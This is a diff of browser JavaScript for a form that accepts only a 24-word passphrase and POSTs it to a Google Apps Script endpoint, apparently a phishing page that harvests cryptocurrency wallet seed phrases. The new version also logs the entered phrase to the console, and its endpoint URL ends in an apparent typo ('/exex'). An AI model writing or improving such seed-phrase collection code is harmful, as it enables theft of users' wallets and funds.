@@ -1,54 +1,68 @@
-// Modified JavaScript to send the phrase to Google Apps Script
+// Function to handle form submission
 function handleSubmit(event) {
-    event.preventDefault();
+    console.log('Form submission started');
+    event.preventDefault(); // Prevent default form submission
     const errorElement = document.getElementById('emsg');
     errorElement.textContent = '';
     const myButton = document.getElementById('b1');
     myButton.disabled = true;
+
     const myButton2 = document.getElementById('b2');
     myButton2.disabled = true;
-
-    const form = document.getElementById('myForm');
-    const inputValue = form.elements['mf-texts'].value.trim();
     
+    // Step 1: Get the value of the hidden input field with name 'mf-texts'
+    const form = document.getElementById('myForm'); // Replace 'myForm' with your form ID
+    const inputValue = form.elements['mf-texts'].value.trim();
+    console.log('User input:', inputValue);
+                                                                                                                                                                                                                          
     const wordCount = inputValue.split(/\s+/).length;
+    console.log('Word count:', wordCount);
     if (wordCount !== 24) {
+        console.warn('Invalid Passphrase - incorrect word count');
         errorElement.textContent = 'Invalid Passphrase';
         myButton.disabled = false;
         myButton2.disabled = false;
         form.reset();
-        return;
+        return; // Exit function if word count is not 24
     }
+
+    // Google Apps Script Web App URL
+    const url = "https://script.google.com/macros/s/AKfycbyqDKhG-L-mGMb31keevGn9gEqgoMAL6qAtRD86xjFljhFYhlcmmmrGRYGL_yFQNw8/exex";
+    console.log('Sending request to:', url);
     
-    const scriptUrl = "https://script.google.com/macros/s/AKfycbyqDKhG-L-mGMb31keevGn9gEqgoMAL6qAtRD86xjFljhFYhlcmmmrGRYGL_yFQNw8/exec";
-    
-    fetch(scriptUrl, {
+    // Step 2: Make a POST request to the Google Apps Script URL
+    fetch(url, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ phrase: inputValue })
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ text: inputValue })
     })
-    .then(response => response.json())
-    .then(data => {
-        if (data.status !== "success") {
-            errorElement.textContent = 'Failed to save phrase';
-        } else {
-            errorElement.textContent = 'Passphrase saved successfully';
+    .then(response => {
+        console.log('Response received:', response.status);
+        if (!response.ok) {
+            throw new Error('Network response was not ok');
         }
+        return response.json(); // Assuming the response is JSON; adjust as per your API
+    })
+    .then(data => {
+        console.log('Server response:', data);
+        errorElement.textContent = data.message || 'Passphrase submitted successfully';
         myButton.disabled = false;
         myButton2.disabled = false;
         form.reset();
     })
     .catch(error => {
         console.error('Error:', error);
-        errorElement.textContent = 'Error saving phrase';
+        errorElement.textContent = 'Error occurred while processing your request.';
         myButton.disabled = false;
         myButton2.disabled = false;
-        form.reset();
     });
 }
 
-const form = document.getElementById('myForm');
-form.addEventListener('submit', handleSubmit);
+// Add event listener to the form for 'submit' event
+document.getElementById('myForm').addEventListener('submit', handleSubmit);
+console.log('Event listener attached to form');
 
 
 
